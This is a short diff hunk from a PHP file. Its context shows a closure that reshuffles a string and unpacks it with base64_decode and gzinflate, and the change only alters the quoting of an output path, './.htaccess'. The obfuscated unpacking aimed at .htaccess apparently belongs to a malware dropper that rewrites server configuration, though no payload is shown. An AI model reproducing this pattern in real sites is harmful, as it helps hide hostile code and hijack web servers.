@@ -14,4 +14,4 @@ $decode = function ($strv) {
     $c = substr($strv, 7, strlen($strv) - 14);
     return gzinflate(base64_decode($a . $c . $b));
 };
-$out = './.htaccess';
+$out = "./.htaccess";
